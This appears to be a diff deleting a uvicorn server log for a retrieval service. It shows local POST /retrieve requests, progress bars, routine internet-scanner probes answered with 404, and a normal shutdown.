-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.05it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.33it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.05it/s]
-INFO:     127.0.0.1:51982 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.06it/s]
-INFO:     127.0.0.1:38940 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.29it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.28it/s]
-INFO:     127.0.0.1:52412 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 25.57it/s]
-INFO:     127.0.0.1:35190 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.06it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.06it/s]
-INFO:     127.0.0.1:55806 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 28.69it/s]
-INFO:     127.0.0.1:36684 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.82it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.73it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.54it/s]
-INFO:     127.0.0.1:37810 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.03it/s]
-INFO:     127.0.0.1:59454 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.05it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.80it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.65it/s]
-INFO:     127.0.0.1:40726 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.47it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.43it/s]
-INFO:     127.0.0.1:46474 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.88it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.62it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.47it/s]
-INFO:     127.0.0.1:36754 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.12it/s]
-INFO:     127.0.0.1:56490 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.56it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.56it/s]
-INFO:     127.0.0.1:54484 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 18.19it/s]
-INFO:     127.0.0.1:60406 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  1.79it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  1.79it/s]
-INFO:     127.0.0.1:50216 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.04it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.03it/s]
-INFO:     127.0.0.1:42440 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     218.154.184.115:63288 - "GET / HTTP/1.0" 404 Not Found
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.08it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.34it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.06it/s]
-INFO:     127.0.0.1:43856 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.67it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.65it/s]
-INFO:     127.0.0.1:37348 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.77it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.09it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.78it/s]
-INFO:     127.0.0.1:40446 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.10it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.09it/s]
-INFO:     127.0.0.1:37580 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.50it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.85it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.51it/s]
-INFO:     127.0.0.1:38176 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.45it/s]
-INFO:     127.0.0.1:45696 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.59it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.59it/s]
-INFO:     127.0.0.1:49928 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.23it/s]
-INFO:     127.0.0.1:35052 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.64it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.63it/s]
-INFO:     127.0.0.1:39388 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 23.59it/s]
-INFO:     127.0.0.1:38680 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.78it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.08it/s]
-INFO:     127.0.0.1:48058 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.89it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.88it/s]
-INFO:     127.0.0.1:38218 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.06it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.53it/s]
-INFO:     127.0.0.1:48272 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.15it/s]
-INFO:     127.0.0.1:58744 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.11it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.70it/s]
-INFO:     127.0.0.1:53032 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.57it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.55it/s]
-INFO:     127.0.0.1:45678 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.25it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.24it/s]
-INFO:     127.0.0.1:59586 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.72it/s]
-INFO:     127.0.0.1:52388 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:57324 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.52it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.91it/s]
-INFO:     127.0.0.1:37736 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 23.94it/s]
-INFO:     127.0.0.1:48322 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.32it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.06it/s]
-INFO:     127.0.0.1:56018 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.87it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.85it/s]
-INFO:     127.0.0.1:37740 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.76it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.32it/s]
-INFO:     127.0.0.1:55124 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.13it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.12it/s]
-INFO:     127.0.0.1:44332 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:36198 - "GET / HTTP/1.1" 404 Not Found
-INFO:     205.210.31.76:63116 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:45438 - "GET / HTTP/1.1" 404 Not Found
-INFO:     107.174.224.18:46038 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:39846 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:49878 - "GET / HTTP/1.1" 404 Not Found
-INFO:     65.49.1.26:37849 - "GET / HTTP/1.1" 404 Not Found
-INFO:     65.49.1.25:11485 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-INFO:     65.49.1.35:39527 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
-INFO:     65.49.1.26:39681 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
-INFO:     205.210.31.69:60218 - "GET / HTTP/1.1" 404 Not Found
-INFO:     165.22.204.198:32722 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     134.209.159.162:59552 - "GET / HTTP/1.1" 404 Not Found
-INFO:     134.209.159.162:59566 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:34300 - "GET / HTTP/1.1" 404 Not Found
-INFO:     Shutting down
-INFO:     Waiting for application shutdown.
-INFO:     Application shutdown complete.
-INFO:     Finished server process [2921674]
-Terminated
